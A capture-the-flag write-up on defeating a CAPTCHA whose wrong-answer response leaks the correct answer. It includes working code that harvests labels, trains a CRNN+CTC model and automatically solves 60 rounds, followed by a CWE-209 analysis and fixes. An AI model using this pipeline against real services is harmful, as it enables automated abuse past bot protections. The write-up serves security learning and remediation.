# [KISIA-CTF final] captcha-v2: Turning a CAPTCHA Into Its Own Label Oracle

A record of solving CAPTCHA and its follow-up CAPTCHA V2, from the MISC category of the KISIA CTF finals. Both were worth 793 points, and the flag ultimately obtained is CAPTCHA V2's.

The core sums up in one sentence. Submit a wrong answer and the server returns the correct answer in the response as-is. This single line of information exposure collapses the CAPTCHA's only security premise – that the answer can be known only by a person looking at the image – and reduces the CAPTCHA to a labeling oracle for training against itself.

The solving environment was macOS (Apple Silicon), Python 3.9, PyTorch 2.8 (MPS backend) and Pillow. The challenge instance expires every 60 minutes and its IP and port change on each restart, so `http://3.35.97.192:36806` appearing in the commands below has to be replaced with the instance address at the time of running.

---

## 1. The challenge

The first challenge, CAPTCHA, begins its description like this. "A service applies a CAPTCHA to block automated access. The administrator judges that the mere existence of a CAPTCHA is enough to block automated requests, and whether the actual implementation is as safe as intended has not been confirmed."

The distributed file was a single `captcha-handout.zip`, and opening it revealed only four RobotoMono fonts and an OFL licence file. No server source is provided. Which is to say, this challenge is not white-box source reading but black-box judgement from API behaviour alone. In exchange, that fonts are given is itself a strong hint. It means the server renders the CAPTCHA in those fonts, and reads as a signal to keep automatic reading in mind.

The clear condition is answering 60 rounds consecutively within 120 seconds. One miss and the streak resets to 0.

We finished V1 from vulnerability discovery through data harvesting to model training (100% validation accuracy), and when the challenge was later replaced with V2, the model weights made in V1 were reused directly as a warm start for the V2 attack and contributed directly to clearing V2.

The second challenge, CAPTCHA V2, is described like this. "After the previous challenge the administrator improved the CAPTCHA verification logic. Some logic was changed so that simple approaches can no longer pass verification, and it cannot be guaranteed that the system is entirely safe."

In the distributed files the fonts grew to four kinds – Anonymous Pro, Courier Prime, Cousine and Space Mono – and a `README.md` was added. The README notes that the public HTTP API can be checked at the running challenge's `/docs`. The time limit dropped to 90 seconds, and the goal is still 60 consecutive rounds. What changed is that one round is now not a single question but a mosaic of three panels. Three strings have to be submitted in the order the markers specify, in `first-second-third` format.

And a condition was written on the challenge page. "A round counts if at least one of the three strings is correct." It is easy to miss, sandwiched among the devices raising the difficulty, and this relaxation rule proves decisive later.

---

## 2. Narrowing the approach

Before picking up any tools, I drew a backward tree descending from the clear condition. The end state is clear: calling `/flag` with the streak at 60. That requires passing 60 rounds consecutively, which requires a sufficiently low per-round failure probability. Here the ways of passing a round diverge.

The route of a person solving them by hand is immediately rejected. 60 questions in 90 seconds is physically impossible. What remains are two routes: bypassing the verification logic itself, and reading the images automatically.

The bypass route is far cheaper to refute. A few HTTP requests determine whether it is true or false. So that side was hit first.

The first hypothesis was round nonce reuse. If the `X-Round-Nonce` in the `/captcha` response headers were a fixed value per round, perhaps a deliberately wrong answer could reveal the correct one and the correct one could then be resubmitted with the same nonce. Trying it returned `{"detail":"no CAPTCHA is awaiting an answer"}`. The round is consumed the moment you submit.

The second hypothesis was round duplication. I checked whether calling `/captcha` several times in a row increased the rounds, and three calls returned the same nonce. The nonce per round is fixed at one.

Third, I checked whether a wrong answer preserves the streak. Right after a wrong answer, `streak: 0` was clearly printed. It does reset.

With all three hypotheses dead, the conclusion was that there is no route skipping rounds themselves. And yet in the course of this probing, the important thing came out.

### The wrong-answer response tells you the correct answer

This is the response that came back when any old string was thrown to verify the first hypothesis.

```json
POST /submit  {"answer":"zzzz", ...}
200 OK
{"correct": false, "streak": 0, "target": 60, "qualified": false,
 "solved": false, "expected_answer": "7wje"}
```

The `expected_answer` field holds the correct answer as-is. Give a wrong answer and the server tells you the answer.

That alone cannot pass a round, because by the time you know the answer the round has already been consumed. That is exactly why the first hypothesis died. But change the viewpoint and the story changes. Keep throwing wrong answers in a session you can discard, and `(CAPTCHA image, correct string)` pairs can be gathered automatically, as many as you like.

When breaking a CAPTCHA with machine learning, the real cost is not on the model-building side but on the labeling side, where a person attaches the correct answer to the training data one by one. This one line of response makes that cost exactly zero. Data with guaranteed correctness can be produced without any human hand at all, without limit, for as long as the server holds up.

From here the attack chain was settled: harvest label data with disposable sessions, fix the image's structure by measurement, train a character recognition model on that data, then answer 60 rounds automatically in a 90-second session.

---

## 3. Tools used

Initial reconnaissance was done with `curl`. Response headers and the CSP were checked, and on V2 the `/openapi.json` the README pointed to was fetched and cross-checked against the API spec.

The harvester and solver were written with Python's standard library `urllib` and `threading` only. Not using an external HTTP library was to reduce dependencies in the reproduction environment.

Image processing used Pillow and NumPy. Panel boundary detection, marker dot counting and mean compositing are all solved with these two.

The model ran on PyTorch 2.8 with the MPS backend. There is one trap here. macOS's MPS backend does not yet implement the `aten::_ctc_loss` operation. Running it as-is throws `NotImplementedError`. Giving the environment variable `PYTORCH_ENABLE_MPS_FALLBACK=1` to fall that operation back to CPU is required for training to run.

---

## 4. Reconnaissance

### API enumeration

`/static/app.js` was read to recover the whole flow. On V2 it was re-confirmed through `/openapi.json`, and the endpoint composition was identical to V1's.

`POST /start` returns a token along with `server_time`, `expires_at`, `deadline_in`, `streak` and `target`. `GET /captcha` gives the PNG body while carrying the round identifier in the response header `X-Round-Nonce`. `POST /submit` takes the token, answer and round_nonce and returns `correct`, `streak` and `solved`, and when wrong, `expected_answer` is attached. When the streak reaches the target, `GET /flag` gives the flag. Authentication is all through an `Authorization: Bearer <token>` header.

The time limit is 120 seconds on V1 and 90 on V2, with a target of 60 on both. The character set on both is `23456789abcdefghjkmnpqrstuvwxyz` – 31 characters excluding the easily confused `0`, `1`, `i`, `l` and `o`. String length varies between 4 and 7 characters.

### Attempting to read V1 images

V1's CAPTCHA was a 240×80 PNG. Curved noise passes over rotated letters painted in several colours.

![Six V1 CAPTCHA samples](/images/kisia-captcha-v2/v1_samples.png)

The answers, from the top, are `nqj7ka`, `brh3rj`, `d4zbz6`, `7b3uc5`, `9627v` and `3dwgn`.

At first glance the letters looked dark purple and the noise lines green. So I judged that separating by colour, binarizing and feeding it to Tesseract would do, and made a mask. The result was failure.

![The result of applying a colour-based mask](/images/kisia-captcha-v2/v1_colorsplit_fail.png)

Only two of six letters remained and the rest disappeared entirely.

To check the cause I pulled a pixel histogram directly rather than guessing by eye, and found each glyph had a different colour and the noise lines shared the same colour palette as the letters. It was an image that could never be separated by colour. The problem was taking a visual impression as a premise without verifying it.

I abandoned rule-based preprocessing and switched to learning-based. With labels obtainable without limit, that side is actually cheaper.

### The structure of V2 images

V2's image is an 808×116 mosaic. There are three panels, each with a small dot marker in its top left.

![A V2 mosaic sample](/images/kisia-captcha-v2/v2_mosaic.png)

This sample's `expected_answer` was `epqgx-fdn58-j2yx6p`. On screen the panel contents from the left were `j2yx6p` (3 dots), `fdn58` (2 dots), `epqgx` (1 dot). Comparing against the answer string gives the rule immediately. The dot count is the ordinal position in the answer. One dot is first, two second, three third.

---

## 5. Measuring the structure rather than guessing it

Trying to fix the panel coordinates from a single image makes detection wobble. Finding boundaries by bright regions in fact gave different coordinates per image, because the contents inside the panels interfere with detection.

The solution is simple. Average several images and the contents, which differ each time, blur out, leaving only the structure that is always in the same place. Sixty images were mean-composited.

![A mean composite of 60 images](/images/kisia-captcha-v2/v2_layout_mean.png)

The panel borders come out clearly. Extracting the dark vertical lines from the mean image's column profile put the panel borders at x = 17, 258 / 283, 524 / 549, 790, with horizontal borders at y = 17, 98. Cropping the interior makes each panel exactly 240×80.

One important observation emerges here. One V2 panel is pixel-identical in specification to a V1 image. The author reused V1's rendering code as-is and lined three of them up. Thanks to that, the model weights trained on V1 could go straight into V2 as initial values, which later cut training time considerably.

### Verifying the marker rule

The dot markers are printed in the panel's top margin (y 0~16) at 5 pixels in size, up to three of them. Count the clusters and you get the ordinal.

I set the premise that "the dot counts will always be a permutation of 1, 2, 3" and exhaustively verified it on 400 images. The result was 0 misclassifications, with the six permutations appearing evenly at 76, 70, 68, 66, 64 and 56 times. Which means marker decoding is a deterministic rule rather than probabilistic inference, and can be trusted 100%.

```
sizes      : Counter({(808, 116): 400})
bad perms  : 0 of 400
perm dist  : (1,2,3):76  (2,3,1):70  (3,2,1):68  (3,1,2):66  (2,1,3):64  (1,3,2):56
```

I also checked by eye that matching cropped panels to `expected_answer` by ordinal actually held.

![Cropped panels with their mapped labels](/images/kisia-captcha-v2/v2_panels.png)

From the top `4ss43gd`, `3kbqh`, `p9wx`, `jxszg` – exactly matching the image contents.

---

## 6. Exploit 1: the label oracle harvester

Repeat `GET /captcha` and `POST /submit` (wrong) in a disposable session to gather image and answer pairs. A wrong submission only sets the streak to 0 while the session itself stays alive, so harvesting can continue on one token.

```python
import urllib.request, json, os, threading, sys, itertools
B=sys.argv[3] if len(sys.argv)>3 else "http://3.35.97.192:36806"

def post(path,data=None,tok=None):
    h={}
    if tok:h["Authorization"]="Bearer "+tok
    body=None
    if data is not None:
        body=json.dumps(data).encode();h["Content-Type"]="application/json"
    req=urllib.request.Request(B+path,data=body,headers=h,method="POST")
    try:
        r=urllib.request.urlopen(req,timeout=25);return json.load(r)
    except Exception as e: return {"err":str(e)}

def getcap(tok):
    req=urllib.request.Request(B+"/captcha",headers={"Authorization":"Bearer "+tok})
    r=urllib.request.urlopen(req,timeout=25)
    return r.headers.get("X-Round-Nonce"), r.read()

os.makedirs("v2data",exist_ok=True)
lock=threading.Lock(); lf=open("v2data/labels.txt","a",buffering=1)
gid=itertools.count(int(sys.argv[2])); done=[0]; TARGET=int(sys.argv[1])

def worker():
    tok=None
    while True:
        with lock:
            if done[0]>=TARGET: return
        try:
            if tok is None:
                tok=post("/start").get("token")
                if not tok: continue
            n,img=getcap(tok)
            # 의도적 오답 → 서버가 expected_answer 로 정답을 알려준다
            w=post("/submit",{"token":tok,"answer":"!","round_nonce":n},tok)
            ans=w.get("expected_answer")
            if not ans: tok=None; continue
            with lock: idx=next(gid); done[0]+=1
            open(f"v2data/{idx:05d}.png","wb").write(img)
            with lock: lf.write(f"{idx:05d}.png {ans}\n")
        except Exception: tok=None

ths=[threading.Thread(target=worker) for _ in range(6)]
for t in ths:t.start()
for t in ths:t.join()
print("done",done[0])
```

It is run like this.

```bash
python3 harvest2.py 5000 10000 http://3.35.97.192:36806
```

This script failed three times before settling into its present form, and I note them so anyone reproducing it does not step in the same traps.

First, the label file must be opened line-buffered (`buffering=1`). I first opened it with the default buffer, and when the process was killed by a timeout the buffer was never flushed, leaving 75 images without labels. Images with no answers cannot be used for training, so they had to be discarded wholesale.

Second, file indices must not be returned on failure. The initial implementation had a worker whose request failed put its index back, and in the meantime another worker took the same number and overwrote the file. Requesting 1,500 images actually left 211. It was solved by making them monotonically increasing with `itertools.count()`.

Third, six concurrent threads is about right. Raising it to 12 saturated the server and requests started timing out instead. Harvest speed measured at 6 threads was about 166 mosaics per minute – about 500 panels per minute.

---

## 7. Exploit 2: building the dataset and training the model

### Splitting mosaics into panels

Cut out panels using the coordinates measured earlier, and split `expected_answer` by the ordinal read from the markers to attach an answer to each panel. One mosaic becomes three panels, so training data is amplified threefold.

```python
from PIL import Image
import numpy as np, os

P=[(18,258),(284,524),(550,790)]          # 5장에서 측정한 패널 x 경계

def dots(a,x0):                            # 마커 점 클러스터 개수 = 순번
    strip=a[0:17,x0-1:x0+45]; cols=(strip<170).sum(axis=0)
    n=0; prev=False
    for v in cols>0:
        if v and not prev: n+=1
        prev=v
    return n

os.makedirs("v2panels",exist_ok=True)
out=open("v2panels/labels.txt","w",buffering=1); n=0; skip=0
for line in open("v2data/labels.txt"):
    fn,ans=line.split()
    parts=ans.split("-")
    if len(parts)!=3: skip+=1; continue
    im=Image.open(os.path.join("v2data",fn)).convert("RGB")
    if im.size!=(808,116): skip+=1; continue
    a=np.asarray(im).astype(int).min(axis=2)
    ds=[dots(a,x0) for x0,_ in P]
    if sorted(ds)!=[1,2,3]: skip+=1; continue        # 마커 무결성 게이트
    for (x0,x1),d in zip(P,ds):
        im.crop((x0,18,x1,98)).save(f"v2panels/{fn[:-4]}_{d}.png")
        out.write(f"{fn[:-4]}_{d}.png {parts[d-1]}\n"); n+=1
out.close(); print("panels",n,"skipped",skip)
```

### CRNN + CTC

String length varies from 4 to 7 characters, so it cannot be solved as fixed-length classification. CTC (Connectionist Temporal Classification), the standard way of handling variable-length sequences, was used.

The structure: pass a 240×80 RGB image through a CNN, fold the height to 1 and make a sequence of width 60. Feed that into a bidirectional LSTM to get a character distribution per timestep, and recover the string with greedy CTC decoding. There are 37 classes including blank.

```python
DEV = torch.device("mps" if torch.backends.mps.is_available() else "cpu")
CHARS = "0123456789abcdefghijklmnopqrstuvwxyz"     # blank=0, 총 37 클래스
W,H = 240,80

def blk(i,o): return nn.Sequential(nn.Conv2d(i,o,3,1,1), nn.BatchNorm2d(o), nn.ReLU())

class CRNN(nn.Module):
    def __init__(s):
        super().__init__()
        s.cnn=nn.Sequential(
            blk(3,64),    nn.MaxPool2d(2),        # 40 x 120
            blk(64,128),  nn.MaxPool2d(2),        # 20 x 60
            blk(128,256), blk(256,256), nn.MaxPool2d((2,1)),   # 10 x 60
            blk(256,512), nn.MaxPool2d((2,1)),                 #  5 x 60
            blk(512,512), nn.MaxPool2d((5,1)),                 #  1 x 60
        )
        s.rnn=nn.LSTM(512,256,num_layers=2,bidirectional=True,batch_first=True,dropout=0.2)
        s.fc=nn.Linear(512,NCLS)
    def forward(s,x):
        f=s.cnn(x).squeeze(2).permute(0,2,1)      # B,60,512
        r,_=s.rnn(f)
        return s.fc(r)                             # B,60,37

def decode(logits):                                # greedy CTC
    ids=logits.argmax(-1).cpu().numpy(); outs=[]
    for seq in ids:
        prev=0; s=""
        for t in seq:
            if t!=0 and t!=prev: s+=i2c[t]
            prev=t
        outs.append(s)
    return outs

model=CRNN().to(DEV)
# V1에서 학습한 가중치로 warm-start (패널 규격이 240x80으로 동일)
model.load_state_dict(torch.load("model.pt",map_location=DEV))
opt=torch.optim.Adam(model.parameters(),lr=3e-4)
ctc=nn.CTCLoss(blank=0,zero_infinity=True)
...
loss.backward(); torch.nn.utils.clip_grad_norm_(model.parameters(),5.0); opt.step()
```

```bash
PYTORCH_ENABLE_MPS_FALLBACK=1 python3 train_v2.py 60
```

Training got stuck three times too.

At first the loss stalled around 3.79 and every prediction came out as an empty string. Blank collapse, common in CTC. A learning rate of 1e-3 had been excessive for the small amount of data; lowering it to 3e-4 and adding gradient clipping (norm 5.0) resolved it.

Next was the MPS `aten::_ctc_loss` non-implementation mentioned earlier, solved by the environment variable fallback.

The last trap was the most dangerous. Accuracy prints as 0% right through the first eight epochs. It is exactly the stretch where you would misjudge training as failed and stop, and in reality it is the normal stall that appears while CTC learns the alignment between input and output. I did in fact stop wrongly here once; not cutting it off and observing to 40 epochs saw it jump to 94%.

### Training results

V1 was easy, using only one font, RobotoMono. Training on 1,483 samples reached 100% exact match on 200 validation samples in 16 epochs.

V2 is harder with four fonts, and the effect of warm-starting from V1 weights was large. What was 0% through 8 epochs from random initialization started already at 66.3% at epoch 0 from a warm start. Training on 1,443 panels recorded 91.7% on 300 validation panels at 24 epochs.

One number should be stated precisely. The harvester ultimately gathered 1,192 mosaics – 3,576 panels – and the model actually used for the clear was trained on a mid-harvest snapshot of 581 mosaics (1,743 panels). Which is to say, 91.7% was obtained without using even half the data, and using all of it would go higher. That V1 had already reached 100% at 1,683 samples suggests as much.

### Why 91.7% is enough

Here the relaxation rule mentioned earlier proves decisive. Because a round is judged on "at least one of three strings correct," with a per-panel accuracy of p the round success rate is the complement of the probability of getting all three wrong.

```
round success rate          = 1 - (1-p)^3 = 1 - (1-0.917)^3 = 0.99943
60 consecutive rounds       = 0.99943^60 ≈ 0.966
```

Which means a panel accuracy of 91.7% alone clears in one session with about 97% probability. The "three panels" structure the defence added to raise the difficulty, combined with the "one correct is enough" rule, ended up providing the attacker with threefold error tolerance instead.

---

## 8. Exploit 3: the live solver

The solver cuts three panels from the received mosaic, reads the ordinals from the markers, infers all three in one batch, and rearranges them by ordinal before submitting. Batching the inference was to reduce per-round latency. Filling 60 rounds in 90 seconds means the round trip per round must not exceed 1.5 seconds.

```python
P=[(18,258),(284,524),(550,790)]

def predict(png):
    im=Image.open(io.BytesIO(png)).convert("RGB")
    g=np.asarray(im).astype(int).min(axis=2)
    crops=[]; ds=[]
    for x0,x1 in P:
        ds.append(dots(g,x0))                                  # 마커 → 순번
        a=np.asarray(im.crop((x0,18,x1,98)),dtype=np.float32)/255.0
        crops.append(np.transpose(a,(2,0,1)))
    x=torch.from_numpy(np.stack(crops)).to(DEV)
    with mlock, torch.no_grad(): preds=decode(model(x))         # 3패널 배치 추론
    slots=[""]*3
    for d,p in zip(ds,preds):
        if 1<=d<=3: slots[d-1]=p                               # 마커 순서로 재배치
    return "-".join(slots)

def session(wid):
    while FLAG[0] is None:
        d=req("/start"); tok=d["token"]; t0=time.time()
        while time.time()-t0<88 and FLAG[0] is None:
            r,img=req("/captcha",tok=tok,raw=True)
            n=r.headers.get("X-Round-Nonce")
            res=req("/submit",{"token":tok,"answer":predict(img),"round_nonce":n},tok)
            if res.get("solved"):
                FLAG[0]=req("/flag",tok=tok)["flag"]; return
```

The session terminates itself at 88 seconds, short of the server's 90-second deadline, and restarts. A safety margin. Sessions were run in parallel on two threads so that a failure on one side retries immediately.

There is one thing that must be kept when running it. The harvester has to be killed first. With the harvester occupying server CPU, round throughput falls and 60 rounds cannot be filled in 90 seconds. I did in fact see requests time out when trying to measure response latency with the harvester still on.

---

## 9. Running it, and the result

The full reproduction procedure is four steps.

```bash
# 1) 라벨 오라클 수확 (분당 약 166 모자이크. 4분이면 581장 = 패널 1,743장으로 충분)
python3 harvest2.py 5000 10000 http://3.35.97.192:36806

# 2) 패널 단위 데이터셋 구성
python3 build2.py

# 3) 학습 (V1 가중치 warm-start, MPS)
PYTORCH_ENABLE_MPS_FALLBACK=1 python3 train_v2.py 60

# 4) 실전 주행 — 수확기는 반드시 종료 후 실행
pkill -f harvest2.py
PYTORCH_ENABLE_MPS_FALLBACK=1 python3 solve_v2.py http://3.35.97.192:36806 2
```

It passed all 60 rounds on the first attempt. Not a single MISS was recorded in the log.

![The execution log with the streak climbing from 1 to 60 and the flag printed](/images/kisia-captcha-v2/success.png)

```
kisia{DdQJoCqj3d45Iqb8zFNSecMt8X3Jlpfe400b2a0e}
```

---

## 10. Vulnerability analysis

The root cause of this challenge is CWE-209, generation of an error message containing sensitive information. `POST /submit` includes `expected_answer` in the response body when the answer is wrong.

The intent is guessable. Telling the user "the answer was XXX" is better for user experience. The frontend code does in fact have logic displaying that text. The problem is that this kindness breaks the CAPTCHA's only security premise head-on. A CAPTCHA stands on the assumption that "the answer can be known only by a person looking at the image," and the server was handing that answer out on request.

As said above, the real cost of a machine learning attack on a CAPTCHA is not the model but the labeling. This single field made that cost zero.

### Why every V2 defence hardening failed

V2 hardened five things and not one was effective.

Raising the fonts to four kinds is meaningless when data is unlimited. The model just learns all four.

Splitting into three panels was counterproductive. Training data was amplified threefold per round.

Marker-based order shuffling was powerless, the markers being a deterministic rule inside the image. Exhaustive inspection of 400 images gave 0 misclassifications. A rule made so a person can see and understand it is read 100% by machines too.

Cutting the time limit from 120 seconds to 90 was no constraint at all when inference per round is tens of milliseconds.

And the rule "pass if at least one of the three strings is correct," presumably a consideration to lower the difficulty, ended up pulling the required accuracy down to 91.7% and making the attack far easier.

To sum up, V2's hardening was all concentrated on the axis of "making the image harder to read." The real vulnerability was on the axis of "the answer leaking." A defence on the wrong axis has no effect, however refined.

### Recommendations

The most important measure is removing the `expected_answer` field. `{"correct": false}` is enough for a wrong-answer response. That one thing alone makes the entire attack described here impossible.

Next, a cap on total round issuance per session and per IP is needed. A normal user has no reason to exceed 60 rounds in 120 seconds, while this attack consumes thousands of sessions. In the same vein, clients with an abnormally high wrong-answer rate – the pattern of harvesting labels – can be detected and blocked.

The design of putting the order marker inside the image as a deterministic pixel pattern is worth reconsidering too. A deterministic rule is always decoded automatically, 100% of the time.

Fundamentally, it is better to accept that a self-implemented image CAPTCHA is vulnerable to machine learning automation. Using a proven third-party CAPTCHA, or replacing it with behaviour-based discrimination, is the recommendation.

---

## 11. Script composition

The scripts used in the solve divide by role as follows.

| File | Role |
| --- | --- |
| `harvest2.py` | the label oracle harvester for V2 |
| `harvest_v1.py` | the harvester for V1 |
| `build2.py` | mosaic → panel dataset conversion (including marker decoding) |
| `train_v2.py` | CRNN+CTC training (with V1 weight warm start) |
| `train_v1.py` | the training script for V1 |
| `solve_v2.py` | the final exploit |

---

## 12. Summary

The `expected_answer` field included in `/submit`'s wrong-answer response made the CAPTCHA its own labeling oracle. Using it, 1,743 labeled training images were collected automatically in a few minutes, a CRNN+CTC model was trained, and 60 rounds were passed without a miss in 90 seconds.

The multi-font, panel-splitting and order-shuffling defences added in V2 were all powerless in the face of the premise that labels are unlimited. The relaxation rule of "pass if at least one of three strings is correct" in particular lowered the required accuracy greatly, making a clear possible with a panel recognition rate of just 91.7%.
